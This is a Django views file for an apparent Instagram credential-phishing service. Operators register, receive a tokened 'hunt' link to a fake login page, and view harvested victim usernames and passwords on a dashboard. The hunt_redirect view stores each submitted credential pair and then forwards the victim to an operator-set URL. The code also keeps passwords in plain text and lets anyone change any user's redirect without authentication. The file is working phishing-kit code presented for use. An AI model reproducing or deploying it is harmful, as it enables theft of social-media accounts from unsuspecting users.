
from django.http import HttpResponse
from django.shortcuts import render
from django.shortcuts import redirect
from .models import Victimsinfo
from .models import Userinfo
import random




def index(request):
    if "username" not in request.session:
        username = "YOU ARE NOT LOGGED IN"
        status = False
    else:
        username = request.session["username"]
        status = True

    user_data = {"username":username.capitalize(),"status":status}

    return  render(request,'index.html',user_data)

def dashboard(request):
    username = request.session["username"]

    userdata = Userinfo.objects.filter(username=username)
    token = userdata[0].token
    r_url = userdata[0].r_url

    victimdata = Victimsinfo.objects.filter(token=token)
    howmanyvic = len(victimdata)

    victims = {}

    for i in range(howmanyvic):
        victims.update({victimdata[i].username:victimdata[i].password})


    purl= f"https://instagram-hunt.herokuapp.com/{token}"
    data = {"username":username,"purl":purl,"victims":victims,"r_url":r_url}

    return render(request,"dashboard.html",data)




def registration_form(request):
    return render(request,"registration_form.html")


def registration(request):
    user_username = request.POST.get("username")
    user_password = request.POST.get("password")

    token = random.randint(10000,99999)
    tokenpresent = Userinfo.objects.filter(token=token)
    if len(tokenpresent) >= 1:
        token = random.randint(10000,99999)

    userpresent = Userinfo.objects.filter(username=user_username)
    if len(userpresent) >= 1:
        data = {"data":"CHOOSE A DIFFERENT USERNAME"}
        return render(request,"result.html",data)

    Useri = Userinfo(username=user_username, password=user_password,token=token)
    Useri.save()

    data = {"data": f"SUCCESSFULLY REGISTERED AS {user_username.capitalize()}"}
    return render(request, "result.html", data)


def login_form(request):
    return render(request,"login_form.html")

def login(request):
    user_username = request.POST.get("username")
    user_password = request.POST.get("password")

    userpresent = Userinfo.objects.filter(username=user_username,password=user_password)
    if len(userpresent) == 0:
        data = {"data":"YOU ENTER WRONG ID PASSWORD"}
        return render(request,"result.html",data)

    request.session["username"] = user_username

    return redirect("/")

def logout(request):
    del request.session["username"]
    return redirect("/")


def hunt_page(request):
    token = request.path
    token = token[1:6]

    data = {"token":token}

    return render(request,"huntpage.html",data)

def hunt_redirect(request):

    username = request.POST.get("username")
    password = request.POST.get("password")
    token = request.POST.get("token")

    Victimi = Victimsinfo(username=username, password=password,token=token)
    Victimi.save()

    user = Userinfo.objects.filter(token=token)
    url = user[0].r_url

    return redirect(url)

def change_r_url(request):

    url = request.POST.get("url")
    username = request.POST.get("username")

    user = Userinfo.objects.get(username=username)
    user.r_url = url
    user.save()


    return redirect("/dashboard")
